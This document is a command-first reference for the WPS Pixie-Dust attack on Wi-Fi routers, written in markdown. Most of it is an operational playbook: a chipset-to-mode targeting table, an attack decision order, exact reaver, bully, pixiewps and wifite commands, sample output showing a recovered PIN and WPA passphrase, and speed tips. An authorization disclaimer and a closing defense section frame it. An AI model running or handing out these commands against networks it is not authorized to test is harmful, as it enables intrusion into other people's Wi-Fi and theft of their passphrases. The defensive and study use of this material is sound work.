# WPS Pixie-Dust — Offline PIN Recovery (Command-First Reference)

> **Scope / authorization.** This document is for **authorized** work only: your own APs, a
> lab you own, sanctioned CTF/competition targets, or OSWP study against your own gear. A
> single WPS exchange is indistinguishable from a legitimate client associating, so "it's quiet"
> is **not** authorization. Keep written scope. Every attack section below is paired with its
> **defense**. Nothing here builds a credential-phishing/evil-twin harvester — for rogue-AP
> topics this file covers **detection and concept only**.

---

## 1. Concept (brief)

WPS (Wi-Fi Protected Setup; the protocol since v2 is **WSC** / Wi-Fi Simple Configuration)
lets a client join WPA/WPA2 with an **8-digit PIN** instead of the passphrase. The external-
registrar PIN exchange (EAP-WSC, messages **M1–M8**) was already brute-forceable online
(Reaver/Bully) because the registrar validates the two PIN halves **independently** (first 4
digits, then the last 3 + 1 checksum digit) → the keyspace collapses from 10^8 to
**10^4 + 10^3 ≈ 11,000** tries. Vendors fought that with rate-limiting and lockouts.

**Pixie-Dust** (Dominique Bongard, DEFCON/Hack.lu 2014) turns that online problem into an
**offline** one. In **M3** the Enrollee (the AP) sends two hashes, `E-Hash1` and `E-Hash2`,
that bind the PIN halves. Each is "protected" by a 128-bit secret nonce — `E-S1` and `E-S2` —
that the AP only reveals later (M5/M7). The spec says those nonces must be random. On many
chipsets they are **not**: they come from a weak PRNG (32-bit state, no external entropy),
are seeded from the WPS-transaction timestamp, come from the *same* generator as the
already-known Enrollee nonce, or are simply **all zeros**. Recover `E-S1`/`E-S2` and you can
brute-force both PIN halves **offline in seconds–minutes** from the data of **one** M1–M3
exchange (~1–3 s on air). `pixiewps` does the offline math; Reaver/Bully/wifite capture the
exchange and feed it in.

> **Why it still matters (2025):** a NetRise study of 24 current consumer/SOHO devices from 6
> vendors found **20 of 24 still vulnerable**; the 4 that were fixed took ~9 years. UIs often
> "disable"/hide WPS while firmware remains exploitable ("silent exploit paths"). This is a
> live finding, not a 2014 museum piece.

---

## 2. The crypto, precisely (what pixiewps actually attacks)

Known WSC M1–M3 key schedule (public spec; this is what every value below means):

```
DHKey   = SHA-256( g^(privE · privR) mod p )            # DH shared secret, both pubkeys exchanged
KDK     = HMAC-SHA-256( DHKey , N1 || EnrolleeMAC || N2 )   # N1=E-Nonce, N2=R-Nonce
AuthKey = first 256 bits of  KDF(KDK, "Wi-Fi Easy and Secure Key Derivation", 640 bits)

PIN             = [ 1st half (4 digits) ][ 2nd half (3 digits + 1 checksum) ]
PSK1 = first 128 bits of  HMAC-SHA-256( AuthKey , 1st-half-PIN )
PSK2 = first 128 bits of  HMAC-SHA-256( AuthKey , 2nd-half-PIN )

E-Hash1 = HMAC-SHA-256( AuthKey , E-S1 || PSK1 || PKE || PKR )
E-Hash2 = HMAC-SHA-256( AuthKey , E-S2 || PSK2 || PKE || PKR )
```

What the attacker **has** after capturing M1–M3 (a modified Reaver/Bully prints `AuthKey`):

- `PKE` — Enrollee DH public key (M1)
- `PKR` — Registrar DH public key (M2)  *(our own, so always known)*
- `E-Nonce` (N1) — Enrollee nonce (M1)
- `R-Nonce` (N2) — Registrar nonce (M2)  *(our own)*
- `E-BSSID` — Enrollee MAC
- `AuthKey` — session key (derived above; Reaver-t6x/Bully fork print it)
- `E-Hash1`, `E-Hash2` (M3)

What the attacker does **not** have: `E-S1`, `E-S2`, `PSK1`, `PSK2`, the PIN.

**The attack:**

1. **Recover the secret nonces `E-S1`/`E-S2`.** This is the only hard part and the whole
   reason "vulnerable chipset" matters. If the PRNG that made `E-S1`/`E-S2` is weak, pixiewps
   reproduces it — seeded from the WPS timestamp, or the same stream that produced the
   already-known `E-Nonce`, or it's literally `0`. (See mode table §3.)
2. **Brute-force half 1 offline:** for each candidate `d1 ∈ [0000..9999]` compute
   `PSK1 = HMAC(AuthKey, d1)[0:16]`, then `HMAC(AuthKey, E-S1 || PSK1 || PKE || PKR)`; the
   `d1` whose result equals `E-Hash1` is the first half. **10^4 hashes.**
3. **Brute-force half 2 offline** the same way against `E-Hash2` with `E-S2`. **10^3** (the
   8th digit is a derivable checksum).
4. Concatenate → the **8-digit WPS PIN**. Total offline cost ≈ a few ms once `E-S1`/`E-S2`
   are known; on a good capture the whole thing is sub-second.

The PIN is **not** the Wi-Fi password. The PIN is then replayed (M4→M8) to make the AP hand
over the real **WPA-PSK** (see §5 step 5).

---

## 3. Vulnerable chipsets ⇄ pixiewps `--mode` (the decision map)

pixiewps auto-selects, but knowing the mapping tells you *in advance* whether a target is an
instant win, and lets you force the right mode for speed.

| `--mode` | Internal name | Vendors / chips | How `E-S1/E-S2` leak | Speed / notes |
|---|---|---|---|---|
| **1** | RT/MT/CL | **Ralink, MediaTek, Celeno** (and many OEM rebrands) | `E-S1 = E-S2 = 0` (nonces never generated) | **Instant win**, ~ms. The classic Pixie kill. |
| **2** | eCos simple | **Broadcom** (eCos RTOS) | Weak PRNG; state recoverable from `E-Nonce` | Fast; some Broadcom need the PSK-based mode-3 trick instead |
| **3** | RTL819x | **Realtek** (RTL8xxx) | PRNG **time-seeded**; same generator as `E-Nonce` | Needs correct **time window** (`--start/--end`); **do NOT use small-DH `-S`** |
| **4** | eCos simplest | some eCos/Broadcom | experimental | only runs if explicitly selected |
| **5** | eCos Knuth | some eCos/Broadcom | experimental (Knuth LCG) | only runs if explicitly selected |

- **Realtek caveat (mode 3):** if the whole M1–M3 happens inside one PRNG tick,
  `E-S1 = E-S2 = E-Nonce`, which is an instant win *if* reaver captured cleanly. Realtek is
  time-sensitive — a clean, single-session capture with a correct clock matters most here.
- **Atheros / Qualcomm:** generally **not** Pixie-vulnerable (proper RNG). Don't waste time;
  fall back to online PIN or move on.
- **Fingerprinting before you transmit:** the beacon/probe WPS IE carries vendor, model, and
  the OUI — enough to guess the chipset (and thus the mode / likelihood) from a **passive**
  `wash`/`airodump --wps` scan before sending a single frame.

---

## 4. The decision order (what a pro actually tries, fastest → slowest)

```
1. Passive recon:  wash  →  note WPS ver, LOCKED state, vendor/chipset guess.
2. Is WPS LOCKED?  yes → pixie may still work on ONE exchange; try once, don't hammer.
3. Pixie-Dust (reaver -K):  Ralink/MediaTek/Realtek/Broadcom → seconds. *** try this first ***
4. WPS NULL PIN (reaver -p ''):  some APs accept an empty PIN outright.
5. Known-default PIN / offline PIN DB (e.g. 12345670, computed-default algorithms).
6. Online PIN brute (reaver/bully, no -K):  only if not locked & not rate-limited; HOURS.
7. Not WPS-vulnerable → leave WPS, pivot to WPA handshake / PMKID + hashcat (separate flow).
```

Pixie is step 3 because when it lands it is the cheapest full-key win in the Wi-Fi toolkit.
If the chipset is Atheros/Qualcomm or `wash` shows a patched/rate-limited AP, skip to 6/7.

---

## 5. Full methodology — exact commands

### 5.0 Adapter prep (TP-Link RTL8188EUS, 2.4 GHz, in Kali)

```bash
# Confirm the adapter and that the rtl8188eus/8188eu driver bound it
ip link                              # find the iface name, e.g. wlan1
iw dev                               # confirm it supports monitor + injection

# Kill interfering daemons (NetworkManager / wpa_supplicant grab the radio)
sudo airmon-ng check kill

# Monitor mode — airmon-ng, OR raw iw (either works)
sudo airmon-ng start wlan1           # -> wlan1mon   (airmon style)
#   --- or, driver-agnostic raw method ---
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up

# Sanity: injection test (Realtek drivers can be flaky on injection)
sudo aireplay-ng --test wlan1mon
```

> RTL8188EUS note: it is 2.4 GHz-only, so every WPS target you can reach is a 2.4 GHz AP — do
> **not** pass `-5/--5ghz`. Use the `aircrack-ng/morrownr 8188eus` DKMS driver for reliable
> monitor+injection; the in-kernel `r8188eu` is hit-or-miss.

### 5.1 Recon — find WPS APs (passive)

```bash
# wash: list WPS-enabled APs on the monitor iface
sudo wash -i wlan1mon                 # add -a to also show non-WPS APs; -s for scan-only
# Columns: BSSID | Ch | dBm | WPS version | WPS LOCKED | Vendor | ESSID
# You want: unlocked (or even locked — pixie can still fire once), strong dBm, known-weak vendor.

# airodump-ng alternative, surfaces WPS column too:
sudo airodump-ng --wps wlan1mon
```

Record **BSSID** and **channel** of the target. Strong signal (≳ −60 dBm) hugely improves a
clean M1–M3 capture.

### 5.2 The attack — Reaver in Pixie-Dust mode (primary path)

```bash
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -N -vv
```

Flag-by-flag:
- `-i wlan1mon` — monitor interface
- `-b AA:BB:CC:DD:EE:FF` — target BSSID
- `-c 6` — lock to the AP's channel (implies `-f`, disables channel hop → stabler capture)
- `-K 1` *(same as `-Z`)* — **run Pixie-Dust**: reaver captures M1–M3 and auto-calls
  `pixiewps`, passing `PKE`, `PKR`, `E-Hash1`, `E-Hash2`, `E-Nonce`, and `AuthKey`
- `-N` / `--no-nacks` — don't send NACKs on out-of-order packets (cleaner exchange on many APs)
- `-vv` — verbose; shows the live WPS exchange and the exact values handed to pixiewps

**What success looks like** (reaver orchestrating pixiewps):

```
[+] Pixie-Dust
[P] E-Nonce: ...
[P] PKE:     ...
[P] PKR:     ...
[P] E-Hash1: ...
[P] E-Hash2: ...
[P] AuthKey: ...
[+] WPS PIN: '04847533'
[+] WPA PSK: 'correct horse battery staple'
[+] AP SSID: 'LabNet'
```

If reaver prints the PIN but *not* the PSK (older reaver, or it exited after pixiewps), replay
the PIN to pull the passphrase — see step 5.5.

### 5.3 Run pixiewps standalone (when you captured values another way / for mode control)

Modified Reaver/Bully (reaver-wps-fork-t6x) print every field; feed them in directly. This is
also how you force a specific mode, widen a Realtek time window, or re-run without touching the
air again.

```bash
pixiewps \
  --pke     <PKE-hex>   \
  --pkr     <PKR-hex>   \
  --e-hash1 <E-Hash1>   \
  --e-hash2 <E-Hash2>   \
  --authkey <AuthKey>   \
  --e-nonce <E-Nonce>
# Optional for session-key recompute when you DON'T have AuthKey (small-DH only):
#   --r-nonce <R-Nonce>  --e-bssid <BSSID>  -S
```

Realtek (mode 3), with a time window and multi-thread:

```bash
pixiewps --pke <..> --pkr <..> --e-nonce <..> --r-nonce <..> --e-bssid <BSSID> \
         --mode 3 --start 01/2019 --end 01/2026 -j 0
# -f / --force : sweep the full 1970..2038 range (slow, last resort)
```

Passive full-capture WPA-PSK recovery (M1–M7, mode-3 devices only, pixiewps ≥ 1.4):

```bash
pixiewps --pke <..> --pkr <..> --e-nonce <..> --r-nonce <..> --e-bssid <BSSID> \
         -7 <enc-settings-M7> --mode 3
# add -5 <enc-settings-M5> to also recover secret nonce 1; add -s/-z to also get the PIN
```

### 5.4 Bully (alternate EAP state machine — try when Reaver stalls)

```bash
sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```
- `-d` — **Pixie-Dust mode** (bully's equivalent of reaver `-K`)
- `-c 6` — channel, `-v 3` — max verbosity
- Bully implements a different EAP/association state machine, so it sometimes completes M1–M3
  on APs where Reaver loops on timeouts (and vice-versa). It's the first fallback, not a
  different attack.

### 5.5 Turn the PIN into the Wi-Fi password

Pixie gives the **PIN**. Replay it (normal online WPS, one known PIN = one try) to make the AP
disclose the **WPA-PSK**:

```bash
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -p 04847533 -vv
# reaver walks M4..M8 with the known PIN and prints: [+] WPA PSK: '...'
```

### 5.6 One-shot automation (wifite2 — runs the whole order for you)

```bash
sudo wifite -i wlan1 --wps --pixie
# --wps      : only show/target WPS-enabled APs
# --pixie    : run the Pixie-Dust attack
# --bully    : use Bully instead of Reaver as the WPS engine
# --reaver   : force Reaver
# --ignore-locks : keep going after the AP reports WPS LOCKED
# --kill     : kill NetworkManager/wpa_supplicant first (equivalent of airmon-ng check kill)
```
With defaults, wifite runs five attacks per target in order: **WPS Pixie-Dust → WPS NULL PIN
→ WPS PIN brute → PMKID → WPA handshake**, and writes any recovered key to its `cracked.json`.
`Ctrl-C` skips the current attack (`c` continue / `e` exit).

---

## 6. Gotchas & pitfalls

- **Pixie prints the PIN but no PSK.** Expected on some builds — it's two phases. Re-run
  reaver with `-p <pin>` (§5.5) to get the passphrase.
- **Small-DH (`-S`) on Realtek.** Don't. The pixiewps/reaver docs are explicit: **never use
  `-S` against Realtek**, and `-S/--dh-small` is deprecated generally (buggy APs). Only ever
  relevant with ancient captures.
- **Realtek time sensitivity.** Mode 3 is seeded from the transaction timestamp. A stale
  capture, a wrong system clock, or a `--start/--end` window that misses the real time → no
  crack even on a vulnerable AP. Capture fresh, set a sane window, or `-f` as last resort.
- **WPS LOCKED.** Rate-limiting/lockouts stop *online* brute force; they do **not** stop Pixie,
  which needs only **one** exchange. But a locked AP may refuse that one exchange — try once,
  wait out `--lock-delay`, or `--ignore-locks`; don't hammer (that's both noisy and
  counterproductive).
- **Dodgy capture = garbage hashes.** Weak signal, channel hopping, or interference corrupt
  M1–M3. Lock the channel (`-c`), get closer, use `-N`, retry. `-vv` lets you confirm the
  `E-Hash1/E-Hash2/AuthKey` actually populated before blaming the chipset.
- **Injection flakiness on RTL8188EUS.** If `aireplay-ng --test` fails, you'll see reaver
  "WARNING: Failed to associate" loops. Fix the driver (morrownr 8188eus DKMS) before blaming
  the target.
- **Monitor iface name drift.** airmon-ng may give `wlan1mon`; raw `iw` keeps `wlan1`. Use the
  name that `iw dev` actually shows, or reaver errors on open.
- **"Patched" that isn't.** A UI toggle that "disables WPS" may leave the firmware stack
  listening (NetRise 2025). Verify with `wash` after any config change — some firmware lies.
- **NULL PIN ≠ Pixie.** `reaver -p ''` (empty PIN) is a *separate* bug; try it as step 4 of the
  order, not as part of `-K`.

---

## 7. Pro tips for speed

- **Fingerprint before transmitting.** Read vendor/model/OUI from the passive `wash`/
  `airodump --wps` output; if it's Ralink/MediaTek you already expect a mode-1 instant win, if
  Atheros you skip Pixie entirely. Decide the mode *before* the first frame.
- **Lock the channel (`-c`) always.** Channel hopping is the #1 cause of dirty captures and slow
  attacks. One known channel = one clean M1–M3.
- **`-N` by default** on stubborn APs; fewer NACKs, cleaner sessions.
- **Force the mode** in standalone pixiewps (`--mode 1` for Ralink/MediaTek) to skip auto-mode
  trial work; add `-j 0` to use all cores for mode-3 time sweeps.
- **Build pixiewps with OpenSSL** (`make OPENSSL=1`) for faster SHA-256 — matters on big
  mode-3/`-f` sweeps.
- **Capture once, crack many.** Save the six values; iterate modes/time windows offline without
  re-touching the air. Fewer frames = quieter + faster.
- **Strong signal wins.** Get to ≳ −60 dBm; a 3-second exchange at good SNR beats ten retries
  at the edge of range.
- **Reaver stalls → switch to Bully** (and vice-versa). Different state machines complete on
  different firmware.

---

## 8. When it's an *instant win* vs. not worth trying

**Instant win (seconds):**
- Ralink / MediaTek / Celeno (**mode 1**, `E-S1=E-S2=0`) — the archetypal Pixie kill.
- Realtek where the full exchange lands in one PRNG tick (`E-S1=E-S2=E-Nonce`), clean capture,
  correct clock.
- Many Broadcom eCos (mode 2) with a recoverable PRNG state.

**Slow / needs work:** Realtek needing a time-window sweep (mode 3 with `--start/--end`/`-f`);
Broadcom needing the experimental mode 4/5.

**Not vulnerable (don't burn time):** Atheros/Qualcomm with a proper RNG; firmware patched past
the Pixie fix. Pivot to online PIN, NULL PIN, default-PIN DBs, or (separate flow) WPA
handshake/PMKID + hashcat on the Mac GPU.

---

## 9. DEFENSE (pair every attack above with this)

**Primary, only complete fix — disable WPS:**
- Turn **WPS off** in the router admin (Wireless/Security). This is the single effective
  mitigation; it removes the entire attack surface regardless of chipset.
- **Verify it actually took.** Re-scan your own AP with `sudo wash -i wlan1mon` — the BSSID
  should **no longer appear** as WPS-enabled. Firmware UIs sometimes "disable" WPS cosmetically
  while the stack keeps answering (NetRise 2025: UI hid WPS, firmware stayed exploitable).

**If WPS can't be fully disabled:**
- **Patch/replace firmware.** Update to a build with a fixed RNG; where the vendor won't,
  consider **OpenWrt** on supported hardware or retire the device. For truly broken chipsets
  (Ralink `E-S=0`, Realtek time-seed), firmware/hardware change is the only real fix — rate-
  limiting does nothing against an offline, one-exchange attack.
- **Rate-limiting / lockout is NOT a Pixie defense.** It slows *online* Reaver/Bully PIN brute
  force only. Pixie needs one exchange and finishes offline. Don't rely on it.

**Detection (blue-team, concept-level):**
- **Config/firmware audit beats wire detection.** A single Pixie exchange looks identical to a
  legitimate client associating, so WIDS signatures are unreliable for the *offline* crack.
  The dependable control is auditing: is WPS off, and is it *really* off (SBOM/binary analysis
  of firmware to find a vulnerable WPS module even when the advisory is vague)?
- **Weak signals you *can* watch for:** bursts of EAP-WSC (WPS) M1–M3 starts from a
  non-provisioning client, repeated associations to the WPS registrar, or WPS activity from a
  MAC that never completes M8. Treat as "someone is probing WPS," not as proof of a crack.
- **Posture:** WPA2-AES or **WPA3**, long random passphrase, WPS disabled and verified, EOL
  gear replaced. The passphrase length doesn't save you if WPS hands out the PIN → PSK, so the
  WPS control is the one that matters here.

**Rogue-AP / evil-twin note:** out of scope as an attack here. Defensive posture only — detect
unexpected BSSIDs advertising your ESSID, watch for deauth floods that precede a twin, and
prefer 802.11w (PMF) and WPA3-SAE, which blunt the deauth/credential-replay setup. This file
does **not** cover building a credential harvester.

---

## 10. Quick command cheat-sheet

```bash
# prep
sudo airmon-ng check kill
sudo airmon-ng start wlan1                          # -> wlan1mon

# recon
sudo wash -i wlan1mon                               # find WPS APs (note BSSID, ch, vendor, LOCKED)

# attack (primary)
sudo reaver -i wlan1mon -b <BSSID> -c <CH> -K 1 -N -vv

# attack (fallback engine)
sudo bully wlan1mon -b <BSSID> -c <CH> -d -v 3

# standalone offline crack / mode & time control
pixiewps --pke <..> --pkr <..> --e-hash1 <..> --e-hash2 <..> --authkey <..> --e-nonce <..>
pixiewps ... --mode 3 --start 01/2019 --end 01/2026 -j 0        # Realtek time sweep

# PIN -> WPA-PSK
sudo reaver -i wlan1mon -b <BSSID> -c <CH> -p <8-digit-PIN> -vv

# one-shot
sudo wifite -i wlan1 --wps --pixie --kill

# other WPS tries, in order
sudo reaver -i wlan1mon -b <BSSID> -c <CH> -p '' -vv            # NULL PIN

# DEFENSE verify (your own AP)
sudo wash -i wlan1mon                               # target BSSID must NOT list as WPS-enabled
```

---

## Sources

Primary tool docs / wikis (read directly):
- pixiewps — official project (wiire-a): https://github.com/wiire-a/pixiewps
- pixiewps FAQ (protocol + attack logic): https://github.com/wiire-a/pixiewps/wiki/FAQ
- pixiewps — Kali Tools page (flags, modes, example output): https://www.kali.org/tools/pixiewps/
- reaver (reaver-wps-fork-t6x) README, full option list & `-K` integration: https://sources.debian.org/src/reaver/1.6.6-2/README.md/
- reaver-wps-fork-t6x repository: https://github.com/t6x/reaver-wps-fork-t6x
- Kali blog — pixiewps / reaver / aircrack-ng updates (fork history, airodump `--wps`): https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/

Methodology / walk-throughs:
- The Hacker Recipes — Wi-Fi / WPS (reaver/bully/pixiewps commands, defense): https://thehacker.recipes/radio/wi-fi/wps/
- gengstah wiki — Pixie Dust (offline WPS PIN recovery): https://gengstah.github.io/wiki/attacks/pixie-dust-wps/
- StationX — How to use Wifite (wifite `--wps`/`--pixie` flags, attack order): https://stationx.net/how-to-use-wifite/
- HackingTutorials — Pixie Dust attack WPS with Reaver: https://hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/
- hackerhandle — Pixie-Dust Wi-Fi attack, theory & practice (keyspace, PIN halves): https://hackerhandle.blogspot.com/2019/08/the-pixie-dust-wifi-attack-theory-and.html

Current vulnerability status / defense context:
- Help Net Security — NetRise 2025 study, 20/24 devices still vulnerable: https://www.helpnetsecurity.com/2025/09/17/many-networking-devices-are-still-vulnerable-to-pixie-dust-attack/
- SecurityWeek — decade-old Pixie Dust still impacts many devices: https://www.securityweek.com/decade-old-pixie-dust-wi-fi-hack-still-impacts-many-devices/

Original research:
- Dominique Bongard, "Offline bruteforce attack on WiFi Protected Setup," Hack.lu / DEFCON 2014 (origin of the attack; E-S1/E-S2 weak-nonce disclosure).
